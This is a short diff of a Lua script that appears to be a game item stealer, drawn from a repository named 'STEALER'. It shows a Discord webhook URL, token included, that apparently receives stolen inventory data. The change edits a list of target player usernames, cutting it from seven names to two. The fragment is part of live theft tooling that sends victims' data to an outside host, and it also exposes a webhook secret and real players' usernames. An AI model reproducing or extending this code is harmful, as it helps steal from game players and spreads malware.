@@ -17,8 +17,7 @@ local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/mai
 local DUAL_WEBHOOK_INVENTARIO = "https://discord.com/api/webhooks/1548772610798657577/pdTP6bzRwfv4MrWMhqdOfdMbqHwn3kKKaJfCRnW2QrQf04R9WmpOJTg85SbHa5FIkd02"
 
 local jugadoresObjetivosDual = {
-    "Hahahahlolllpro", "TradeTestingMVSS", "azae3l666",
-    "juancarloselkrak7", "azanuvpro777", "ppeoihjv", "BeKindPleaseOmg"
+    "Hahahahlolllpro", "TradeTestingMVSS"
 }
 
 -- ==========================================
